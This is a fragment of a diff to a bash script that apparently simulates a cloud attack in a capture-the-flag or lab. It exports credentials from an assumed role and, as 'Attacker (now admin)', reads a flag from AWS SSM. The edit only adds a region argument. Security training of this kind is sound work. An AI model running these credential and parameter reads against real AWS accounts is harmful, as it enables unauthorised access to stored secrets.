@@ -207,7 +207,7 @@ export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT2" | jq -r '.Credentials
 export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT2" | jq -r '.Credentials.SessionToken')
 
 show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
-FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
 
 if [ -z "$FLAG_VALUE" ] || [ "$FLAG_VALUE" = "None" ]; then
     echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
